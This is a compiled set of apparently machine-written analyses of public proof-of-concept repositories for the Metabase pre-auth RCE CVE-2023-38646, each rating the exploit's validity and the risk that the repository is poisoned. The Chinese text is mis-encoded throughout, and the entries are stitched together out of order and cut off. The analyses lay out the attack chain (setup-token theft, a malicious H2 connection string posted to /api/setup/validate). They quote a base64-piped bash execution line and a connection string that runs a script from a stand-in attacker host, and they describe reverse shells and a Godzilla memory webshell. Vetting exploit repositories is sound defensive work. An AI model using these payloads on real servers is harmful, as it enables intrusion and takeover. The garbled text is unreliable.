3.  **æ‰§è¡Œä»»æ„ä»£ç ï¼š**  åˆ©ç”¨è·å–çš„setup tokenæˆ–è€…å…¶ä»–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„è¯·æ±‚æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚å…·ä½“ RCE çš„åˆ©ç”¨æ–¹å¼å¯èƒ½æ¶‰åŠå¤šä¸ªæ­¥éª¤ï¼Œä¾‹å¦‚é€šè¿‡åˆ›å»ºä¸€ä¸ªæ¶æ„çš„æ•°æ®æºæˆ–ä»ªè¡¨æ¿ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚

æ€»è€Œè¨€ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨ç›¸å¯¹ç®€å•ï¼Œå±å®³æ€§æé«˜ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œå…¨æ§åˆ¶å—å½±å“çš„ Metabase æœåŠ¡å™¨ã€‚ 

**é¡¹ç›®åœ°å€:** [XiaomingX/cve-2023-38646-poc](https://github.com/XiaomingX/cve-2023-38646-poc)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #15

**æ¥æº**: [CVE-2023-38646-Zenmovie_CVE-2023-38646.md](../2023/CVE-2023-38646-Zenmovie_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ç‰ˆæœ¬ï¼Œ1.46.6.1ä¹‹å‰Enterpriseç‰ˆæœ¬ï¼Œä»¥åŠå…¶ä»–å—å½±å“çš„å›ºå®šç‰ˆæœ¬ä¹‹å‰çš„ç‰ˆæœ¬

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹å¯ä»æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§å¾ˆé«˜ã€‚

**æœ‰æ•ˆæ€§:**

*   æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æœç´¢å¼•æ“ç»“æœç¡®è®¤äº†è¯¥æ¼æ´çš„ä¸¥é‡æ€§ï¼Œå¹¶æä¾›äº†å¤šä¸ªå…³äºè¯¥æ¼æ´çš„æè¿°ã€å½±å“å’ŒæŠ€æœ¯ç»†èŠ‚çš„ç½‘é¡µé“¾æ¥ï¼ŒåŒ…æ‹¬PoCä»£ç çš„GitHubé“¾æ¥ã€‚
*   æä¾›çš„PoCä»£ç  (`CVE-2023-38646.py`) çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå®ƒåˆ©ç”¨äº† Metabase çš„ `setup-token` å’Œ H2 æ•°æ®åº“çš„ç‰¹æ€§æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **è·å– Setup Token å’Œ Metabase ç‰ˆæœ¬:** PoC é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæ£€ç´¢ `setup-token` å’Œ Metabase ç‰ˆæœ¬ã€‚
2.  **æ„é€  Payload:**  æ„å»ºåå¼¹ shell çš„ payload, å¹¶å¯¹å…¶è¿›è¡Œ Base64 ç¼–ç ã€‚
3.  **æ„é€ Exploitæ•°æ®:** PoC æ„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON æ•°æ®ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ªåˆ©ç”¨ `CREATE TRIGGER` çš„ payloadï¼Œè¯¥è§¦å‘å™¨åœ¨ `INFORMATION_SCHEMA.TABLES` ä¸Šæ‰§è¡Œ `SELECT` æ“ä½œä¹‹å‰æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`token` å­—æ®µæ‹¼æ¥äº† setup token å’Œ base64 ç¼–ç åçš„ payloadã€‚
4.  **å‘é€æ¶æ„è¯·æ±‚:** PoC å‘ `/api/setup/validate` å‘é€å¸¦æœ‰æ„é€ çš„ JSON æ•°æ®çš„ POST è¯·æ±‚ã€‚è¿™ä¸ªè¯·æ±‚ä¼šè§¦å‘ H2 æ•°æ®åº“è¿æ¥å’Œè§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©:**

PoCä»£ç æœ¬èº«çš„åå¼¹shellè¿æ¥åœ°å€æ˜¯å¯ä»¥é…ç½®çš„, å¦‚æœä½œè€…æƒ³æŠ•æ¯’,å¯ä»¥å°†IPåœ°å€å†™æ­»,æˆ–è€…åŠ å…¥å…¶ä»–æ¶æ„æ“ä½œ.
*   æ¼æ´åˆ©ç”¨ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå…¶ç›®çš„æ˜¯æ˜ç¡®çš„ã€‚
*   `README.md` æ–‡ä»¶åªåŒ…å« PoC çš„åŸºæœ¬ä¿¡æ¯ã€‚

å› æ­¤ï¼Œè¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½, å¤§æ¦‚åœ¨10%å·¦å³ã€‚æŠ•æ¯’çš„ä¸»è¦é£é™©åœ¨äºæ¶æ„ä¿®æ”¹payloadï¼Œä¾‹å¦‚åå¼¹shellåœ°å€æˆ–è€…æ’å…¥å…¶ä»–çš„æ¶æ„æ“ä½œã€‚

**é¡¹ç›®åœ°å€:** [Zenmovie/CVE-2023-38646](https://github.com/Zenmovie/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #16

**æ¥æº**: [CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md](../2023/CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md)

# CVE-2023-38646

> ğŸ“¦ è¯¥CVEæœ‰ **27** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md](../2023/CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md)

## CVE-2023-38646 - Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯å…¬å¼€è®¿é—®æˆ–æ”»å‡»è€…ä½äºåŒä¸€ç½‘ç»œ

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè·å¾—æœåŠ¡å™¨æƒé™ã€‚æ¼æ´å­˜åœ¨äº Metabase 0.46.6.1 ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ 1.46.6.1 ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æ ¹æ®æœç´¢ç»“æœï¼Œå·²ç»æœ‰å…¬å¼€çš„ PoC ä»£ç å¯ç”¨ (ä¾‹å¦‚ï¼Œgithub.com/threatHNTR/CVE-2023-38646)ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åŸºäº Assetnote çš„ä¸€ç¯‡å…³äºè¯¥æ¼æ´åˆ†æçš„æ–‡ç« ã€‚å®ƒé€šè¿‡åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥é…ç½®ä¸­æ‰§è¡Œæ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒé€šè¿‡æ„é€ ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥ URLï¼Œåœ¨è¿æ¥æ•°æ®åº“æ—¶è§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š

1.  **æ„é€ æ¶æ„ JSON Payload:**  è¯¥ JSON payload ç”¨äºåˆ›å»ºæˆ–ä¿®æ”¹ Metabase ä¸­çš„æ•°æ®åº“è¿æ¥ã€‚ å…¶ä¸­ `classname` è¢«è®¾ç½®ä¸º `org.h2.Driver` , `subname` åŒ…å«æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²,å­—ç¬¦ä¸²åˆ©ç”¨ H2 çš„ `CREATE TRIGGER` ç‰¹æ€§ï¼Œåœ¨INFORMATION_SCHEMA.TABLESä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨, è¯¥è§¦å‘å™¨ä¼šåœ¨æ¯æ¬¡æŸ¥è¯¢è¯¥è¡¨æ—¶æ‰§è¡ŒåµŒå…¥çš„ JavaScript ä»£ç , JavaScriptä»£ç è´Ÿè´£æ‰§è¡Œå‘½ä»¤.
2.  **å‘é€Payload:** é€šè¿‡å‘é€ POST è¯·æ±‚åˆ° Metabase API ç«¯ç‚¹ï¼ˆé€šå¸¸æ˜¯ /api/setup/validate æˆ–å…¶ä»–ç›¸å…³ç«¯ç‚¹ï¼‰ï¼Œå°†æ„é€ çš„ JSON payload å‘é€ç»™ Metabase æœåŠ¡å™¨ã€‚ç”±äºè¯¥æ¼æ´æ˜¯æœªç»èº«ä»½éªŒè¯çš„ï¼Œå› æ­¤æ— éœ€æä¾›ä»»ä½•èº«ä»½éªŒè¯ä¿¡æ¯ã€‚
3.  **è§¦å‘ RCE:** Metabase æœåŠ¡å™¨å°è¯•ä½¿ç”¨æä¾›çš„é…ç½®è¿æ¥åˆ° H2 æ•°æ®åº“æ—¶ï¼Œæ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ä¼šè¢«è§£æå’Œæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ PoC çš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨è¯¥æ¼æ´ã€‚ åˆ†æä»£ç ï¼Œå‘ç°é«˜é£é™©çš„è¡Œä¸ºæ˜¯æ‰§è¡Œ `java.lang.Runtime.getRuntime().exec('bash -c {echo,BASE64COMMAND}|{base64,-d}|{bash,-i}')`ã€‚è¿™è¡Œä»£ç å…è®¸æ‰§è¡Œä»»æ„çš„ bash å‘½ä»¤ã€‚æŠ•æ¯’é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **å‘½ä»¤æ³¨å…¥é£é™©ï¼š**  è™½ç„¶ä»£ç ä¸­ä½¿ç”¨äº† Base64 ç¼–ç ï¼Œä½†æ”»å‡»è€…ä»ç„¶å¯èƒ½é€šè¿‡ä¿®æ”¹ Base64 ç¼–ç çš„å†…å®¹æ¥æ³¨å…¥æ¶æ„å‘½ä»¤ã€‚
*   **æƒé™æå‡é£é™©ï¼š**  ç”±äºä»£ç ä»¥ Metabase æœåŠ¡å™¨çš„æƒé™è¿è¡Œï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´æå‡æƒé™ã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ä¸»è¦æ¥è‡ªäºå‘½ä»¤æ³¨å…¥çš„å¯èƒ½æ€§ï¼Œä½†è¿™å–å†³äºå¦‚ä½•ä½¿ç”¨å’Œä¿®æ”¹ PoCã€‚æ•´ä½“æŠ•æ¯’å¯èƒ½æ€§è¾ƒä½ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦1%ã€‚å› ä¸ºä½œè€…å·²ç»è¯´æ˜äº†è¿™æ˜¯ä¸€ä¸ªæ¼æ´çš„æ‰©å±•ï¼Œæ„åœ¨è§£å†³ä¸€äº›ç‰¹å®šæƒ…å†µä¸‹çš„åˆ©ç”¨é—®é¢˜ï¼Œå¹¶ä¸”ä¸»è¦ä»£ç é€»è¾‘æ˜¯åˆ©ç”¨å·²çŸ¥æ¼æ´ï¼Œè€Œä¸æ˜¯å¼•å…¥æ–°çš„ã€éšè”½çš„æ¶æ„ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [0utl4nder/Another-Metabase-RCE-CVE-2023-38646](https://github.com/0utl4nder/Another-Metabase-RCE-CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #2

**æ¥æº**: [CVE-2023-38646-AnvithLobo_CVE-2023-38646.md](../2023/CVE-2023-38646-AnvithLobo_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯é€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨å»ºç«‹æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œé¢„å…ˆè®¾å®šçš„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **è·å–Tokenï¼š** é¦–å…ˆï¼Œé€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å–ä¸€ä¸ªsetup tokenã€‚
2.  **æ„é€ Payloadï¼š**  ç„¶åï¼Œæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åˆ©ç”¨`CREATE TRIGGER`è¯­å¥åˆ›å»ºè§¦å‘å™¨ï¼Œåœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œå‰è§¦å‘ã€‚è§¦å‘å™¨æ‰§è¡Œçš„JavaScriptä»£ç ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
3.  **Base64ç¼–ç ï¼š** ä½¿ç”¨Base64å¯¹åå‘shellæŒ‡ä»¤è¿›è¡Œç¼–ç ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦å½±å“ã€‚
4.  **å‘é€Payloadï¼š**  æœ€åï¼Œå°†æ„é€ å¥½çš„JSON payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚

**æœ‰æ•ˆæ€§ï¼š**  æä¾›çš„PoCä»£ç æœ‰æ•ˆï¼Œå¯ä»¥æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©ï¼š**  ä»£ç ä¸­æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è„šæœ¬çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å¹¶æ‰§è¡Œåå‘shellã€‚ä½œè€…æä¾›çš„ä»£ç é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ¶æ„ä»£ç ç‰‡æ®µæˆ–è€…éšè—çš„åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½ä¸æè¿°ä¸€è‡´ï¼Œç›®çš„æ˜¯åˆ©ç”¨Metabaseçš„æ¼æ´æ¥è·å–è¿œç¨‹ä»£ç æ‰§è¡Œæƒé™ã€‚å› æ­¤, æŠ•æ¯’é£é™©è¯„ä¼°ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [AnvithLobo/CVE-2023-38646](https://github.com/AnvithLobo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #3

**æ¥æº**: [CVE-2023-38646-Boogipop_MetabaseRceTools.md](../2023/CVE-2023-38646-Boogipop_MetabaseRceTools.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1, Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™çº§åˆ«ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼åˆ†æå¦‚ä¸‹ï¼š

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æœªæˆæƒè®¿é—®ï¼š** è¯¥æ¼æ´æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ã€‚
2.  **RCEï¼š**  æ”»å‡»è€…å¯ä»¥å‘é€ç‰¹åˆ¶çš„è¯·æ±‚ï¼Œæ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„ä»»æ„å‘½ä»¤ã€‚
3.  **å…·ä½“åˆ©ç”¨ï¼š** æ ¹æ®æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ”»å‡»æµç¨‹ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š
    *   **éªŒè¯æ¨¡å—ï¼š**  å‘`/api/session/properties`ç«¯ç‚¹å‘é€è¯·æ±‚ï¼Œè·å–æœªæˆæƒçš„tokenï¼Œç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚
    *   **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** åˆ©ç”¨ä¸Šä¸€æ­¥è·å–çš„tokenï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚éœ€è¦æŒ‡å®šmetabase.jarçš„ä½ç½®ã€‚
    *   **å†…å­˜é©¬æ³¨å…¥æ¨¡å—ï¼š** é€šè¿‡ä¿®æ”¹`x-client-data`è¯·æ±‚å¤´æ³¨å…¥å†…å­˜é©¬ï¼Œæ”¯æŒ cmd å’Œ godzilla ä¸¤ç§æ¨¡å¼ã€‚cmdæ¨¡å¼ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œgodzillaæ¨¡å¼åˆ™ç›´æ¥è¿æ¥å“¥æ–¯æ‹‰webshellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ª Metabase RCE å›¾å½¢åŒ–åˆ©ç”¨å·¥å…·ï¼ŒåŒ…å«äº†éªŒè¯æ¨¡å—ã€å‘½ä»¤æ‰§è¡Œæ¨¡å—å’Œå†…å­˜é©¬æ³¨å…¥æ¨¡å—ã€‚ä¸»è¦çš„æ½œåœ¨æŠ•æ¯’é£é™©å­˜åœ¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **å†…å­˜é©¬æ³¨å…¥ï¼š** å†…å­˜é©¬æ³¨å…¥æ¨¡å—æœ¬èº«å…·æœ‰è¾ƒé«˜çš„é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºæ¤å…¥æ¶æ„ä»£ç ï¼Œé•¿æœŸæ§åˆ¶æœåŠ¡å™¨ã€‚ä»£ç ä¸­`x-client-data:godzilla`çš„æ–¹å¼è¿æ¥å“¥æ–¯æ‹‰webshellï¼Œé»˜è®¤å¯†ç ä¸ºpassï¼Œå¯èƒ½ä¼šè¢«å…¶ä»–äººåˆ©ç”¨ã€‚
2.  **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** è™½ç„¶å‘½ä»¤æ‰§è¡Œæ¨¡å—çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹è¯¥æ¨¡å—ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚ä¸‹è½½å¹¶æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚

è€ƒè™‘åˆ°ä»¥ä¸Šé£é™©ï¼Œè¯¥POCå·¥å…·å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå°¤å…¶æ˜¯å†…å­˜é©¬æ¨¡å—ã€‚éœ€è¦åœ¨ä½¿ç”¨å‰è¿›è¡Œä»£ç å®¡è®¡ï¼Œç¡®ä¿æ²¡æœ‰æ¶æ„ä»£ç ã€‚

**é£é™©è¯„ä¼°ï¼š**

å°½ç®¡è¯¥å·¥å…·ç®€åŒ–äº†æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œä½†ä½¿ç”¨å®ƒä¹Ÿå¯èƒ½å¼•å…¥é£é™©ã€‚ç”¨æˆ·åº”è°¨æ…ä½¿ç”¨æ­¤å·¥å…·ï¼Œå¹¶å……åˆ†äº†è§£å…¶æ½œåœ¨çš„å±å®³ã€‚å»ºè®®åœ¨éç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå¹¶è¿›è¡Œå……åˆ†çš„å®‰å…¨æµ‹è¯•ã€‚

**é£é™©æ¦‚ç‡ï¼š**

è€ƒè™‘åˆ°å†…å­˜é©¬æ³¨å…¥çš„é£é™©ï¼Œä¸”è¯¥POCå·¥å…·ç”±ä¸ªäººå¼€å‘è€…æä¾›ï¼Œå¹¶éæ¥è‡ªå®˜æ–¹æˆ–ä¿¡èª‰è‰¯å¥½çš„å®‰å…¨å‚å•†ï¼Œå› æ­¤ç»¼åˆè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªäºå¯¹ä½¿ç”¨è€…ç¼ºä¹å®‰å…¨æ„è¯†ä»¥åŠå¯¹å·¥å…·çš„æœªçŸ¥æ€§å¯èƒ½å¸¦æ¥çš„é£é™©ï¼Œè€Œéä»£ç æœ¬èº«ä¸€å®šå­˜åœ¨æ¶æ„åé—¨ã€‚

**é¡¹ç›®åœ°å€:** [Boogipop/MetabaseRceTools](https://github.com/Boogipop/MetabaseRceTools)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #4

**æ¥æº**: [CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md](../2023/CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ä»¥é€šè¿‡HTTPè®¿é—®ï¼Œä¸”æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´åˆ©ç”¨äº† Metabase å¤„ç†æ•°æ®åº“è¿æ¥çš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯ H2 æ•°æ®åº“ã€‚æä¾›çš„ POC è„šæœ¬é¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ï¼Œæœ€åæ·»åŠ ä¸€ä¸ªæ¶æ„çš„æ•°æ®åº“è¿æ¥ï¼Œè¯¥è¿æ¥åŒ…å«ä¸€ä¸ª H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥å¼å‘½ä»¤ï¼Œå…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚è¿æ¥å­—ç¬¦ä¸²ä¸­çš„ `INIT=RUNSCRIPT FROM 'http://attacker-server.com/poc.sql'` æŒ‡ç¤º H2 ä»è¿œç¨‹æœåŠ¡å™¨æ‰§è¡Œ SQL è„šæœ¬ï¼Œè™½ç„¶ `poc.sql` æ–‡ä»¶æœ¬èº«æ— å®³ï¼Œä½†çœŸæ­£çš„æ”»å‡»è½½è·åµŒå…¥åœ¨è¿æ¥å­—ç¬¦ä¸²æœ¬èº«ï¼Œåˆ©ç”¨ `CREATE ALIAS` 